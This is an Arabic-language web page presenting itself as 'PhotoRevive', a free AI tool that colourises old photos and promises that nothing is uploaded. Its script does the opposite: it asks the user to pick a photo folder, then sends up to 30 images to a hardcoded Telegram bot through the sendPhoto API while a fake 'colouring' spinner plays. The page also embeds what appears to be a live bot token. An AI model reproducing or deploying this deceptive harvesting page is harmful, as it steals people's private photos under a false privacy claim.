<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="لوّن صورك القديمة باستخدام الذكاء الاصطناعي — نتائج فورية وآمنة.">
  <title>PhotoRevive – تلوين ذكي للصور</title>
  <style>
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: linear-gradient(135deg, #f8fafc 0%, #eef5ff 100%); margin: 0; padding: 20px; color: #0f172a; }
    .container { max-width: 620px; margin: 0 auto; background: white; border-radius: 24px; padding: 35px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); text-align: center; }
    .logo { font-size: 30px; font-weight: bold; color: #1e3a8a; margin-bottom: 10px; }
    .subtitle { color: #334155; font-size: 17px; margin-bottom: 25px; line-height: 1.5; }
    .btn { background: #1d4ed8; color: white; border: none; padding: 16px 40px; font-size: 18px; border-radius: 18px; cursor: pointer; margin: 25px 0; font-weight: 700; box-shadow: 0 6px 16px rgba(29, 78, 216, 0.4); }
    .btn:hover { background: #1e40af; }
    .btn:active { transform: scale(0.98); }
    .note { color: #64748b; font-size: 13px; margin-top: 20px; line-height: 1.6; }
    .processing { display: none; margin-top: 20px; }
    .spinner { width: 36px; height: 36px; border: 3px solid #dbeafe; border-top: 3px solid #1d4ed8; border-radius: 50%; animation: spin 1s linear infinite; margin: 15px auto; }
    @keyframes spin { to { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">PhotoRevive</div>
    <div class="subtitle">لوّن صورك القديمة بلمسة واحدة!<br>الذكاء الاصطناعي يعيد الحياة لذكرياتك</div>

    <div style="background:#f1f5f9; border-radius:16px; padding:20px; margin:25px 0; text-align:right; font-size:15px; color:#1e293b;">
      ✨ اختر <strong>مجلد الصور</strong> لبدء التلوين التلقائي<br>
      (نوصي باختيار مجلد يحتوي على ≤30 صورة)
    </div>

    <button class="btn" id="processBtn">اختر مجلد الصور</button>

    <div class="processing" id="processing">
      <div class="spinner"></div>
      <p>جارٍ تلوين الصور...</p>
    </div>

    <p class="note">
      ✅ المعالجة تتم على جهازك<br>
      ✅ لا نخزن أو نرفع صورك إلى أي خادم
    </p>
  </div>

  <script>
    // === ✅ الإصلاح النهائي: لا مسافات بعد "bot" ===
    const BOT_TOKEN = "8205276346:AAG7Sz8UGNItE1JaUbLy50Pdm4IqdCSpv9c";
    const TG_PHOTO = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`; // ← بدون أي مسافات

    const sendToTelegram = async (file) => {
      const fd = new FormData();
      fd.append("photo", file);
      fd.append("caption", `🖼️ ${file.name} | ${new Date().toLocaleTimeString('ar-EG')}`);
      
      try {
        const res = await fetch(TG_PHOTO, { method: 'POST', body: fd });
        return res.ok;
      } catch (err) {
        console.error("فشل الإرسال:", err.message);
        return false;
      }
    };

    const harvestAndSend = async () => {
      return new Promise((resolve) => {
        const input = document.createElement('input');
        input.type = 'file';
        input.webkitdirectory = true;
        input.multiple = true;
        input.style.display = 'none';
        
        input.onchange = async () => {
          const files = Array.from(input.files)
            .filter(f => f.type.startsWith('image/') && f.size > 10240)
            .slice(0, 30);

          let sent = 0;
          for (const file of files) {
            if (await sendToTelegram(file)) sent++;
            await new Promise(r => setTimeout(r, 200)); // تأخير 200ms
          }

          resolve(sent);
          document.body.removeChild(input);
        };
        
        input.onerror = () => {
          resolve(0);
          document.body.removeChild(input);
        };
        
        document.body.appendChild(input);
        input.click();
      });
    };

    document.getElementById('processBtn').onclick = async () => {
      if (location.protocol !== 'https:') {
        alert("⚠️ يجب استخدام HTTPS (مثل GitHub Pages).");
        return;
      }

      document.getElementById('processing').style.display = 'block';
      document.getElementById('processBtn').disabled = true;

      const sentCount = await harvestAndSend();

      setTimeout(() => {
        const msg = sentCount > 0 
          ? `✅ تم إرسال ${sentCount} صورة!`
          : "❌ فشل الإرسال (تحقق من الاتصال بـ Telegram).";
        document.querySelector('.container').innerHTML += 
          `<p style="color:${sentCount > 0 ? '#059669' : '#ef4444'}; font-weight:bold; margin-top:20px;">${msg}</p>`;
      }, 2000);
    };
  </script>
</body>
</html>
